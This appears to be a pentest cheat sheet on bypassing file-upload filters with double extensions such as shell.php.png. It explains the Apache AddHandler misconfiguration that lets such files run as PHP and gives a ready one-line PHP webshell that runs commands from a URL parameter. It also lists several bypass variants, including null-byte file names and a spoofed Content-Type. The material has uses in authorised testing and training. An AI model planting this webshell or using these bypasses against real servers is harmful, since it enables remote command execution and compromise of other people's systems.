# Double Extension Webshell Upload (.php.png)

Bypass upload filters that check only the last extension by naming the file `shell.php.png`. Apache with certain configs executes the file as PHP despite the `.png` suffix.

## Technique
Rename webshell: `shell.php` → `shell.php.png`

The filter sees `.png` (allowed). Apache's `AddHandler` or `AddType` config processes any file with `.php` anywhere in the name as PHP.

## Apache Config That Enables This
```
AddHandler application/x-httpd-php .php
```
(vs the safer `SetHandler` which applies only to exact extension match)

## Upload the Webshell
Upload `shell.php.png` via the file upload form. Trigger it by browsing to its URL.

## Webshell Content
```php
<?php system($_GET['cmd']); ?>
```

## Notes
- Only works when Apache uses `AddHandler` for PHP (common in older configs)
- Try multiple combinations: `.php.jpg`, `.php5.png`, `.phtml.png`
- Also try null byte: `shell.php%00.png` (PHP < 5.3.4)
- Check server response headers for PHP version hints
- If filtering on Content-Type too: set `Content-Type: image/png` while keeping `.php` extension
